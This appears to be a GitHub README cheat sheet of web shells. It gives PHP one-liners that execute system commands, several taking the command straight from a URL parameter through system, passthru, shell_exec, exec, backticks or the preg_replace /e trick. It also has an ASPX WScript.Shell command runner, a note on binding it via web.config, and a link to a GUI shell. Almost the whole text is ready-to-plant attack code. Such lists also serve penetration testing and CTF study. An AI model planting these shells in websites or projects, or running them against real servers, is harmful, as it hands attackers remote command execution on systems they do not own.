# PHP Webshells

- https://github.com/cspshivam/webshells

#### Execute one command

`<?php system("whoami"); ?>`

#### Take input from the url paramter. shell.php?cmd=whoami


`<?php system($_GET['cmd']); ?>`

#### The same but using passthru

[](https://github.com/cspshivam/webshells#the-same-but-using-passthru)

`<?php passthru($_GET['cmd']); ?>`

#### For shell_exec to output the result you need to echo it

[](https://github.com/cspshivam/webshells#for-shell_exec-to-output-the-result-you-need-to-echo-it)

`<?php echo shell_exec("whoami");?>`

#### Exec() does not output the result without echo, and only output the last line. So not very useful!

[](https://github.com/cspshivam/webshells#exec-does-not-output-the-result-without-echo-and-only-output-the-last-line-so-not-very-useful)

`<?php echo exec("whoami");?>`

#### Instead to this if you can. It will return the output as an array, and then print it all.

[](https://github.com/cspshivam/webshells#instead-to-this-if-you-can-it-will-return-the-output-as-an-array-and-then-print-it-all)

`<?php exec("ls -la",$array); print_r($array); ?>`

#### preg_replace(). This is a cool trick

[](https://github.com/cspshivam/webshells#preg_replace-this-is-a-cool-trick)

`<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>`

#### Using backticks

[](https://github.com/cspshivam/webshells#using-backticks)

``<?php $output = `whoami`; echo "<pre>$output</pre>"; ?>``

#### Using backticks

[](https://github.com/cspshivam/webshells#using-backticks-1)

``<?php echo `whoami`; ?>``

#### Web shell with GUI

[](https://github.com/cspshivam/webshells#web-shell-with-gui)

Try Sweetuu : `github.com/cspshivam/sweetuu`

# ASPX Webshell

[](https://github.com/cspshivam/webshells#aspx-webshell)

#### Execute Command

[](https://github.com/cspshivam/webshells#execute-command)

```
<%
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c whoami")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

This shell can be binded with `web.config` file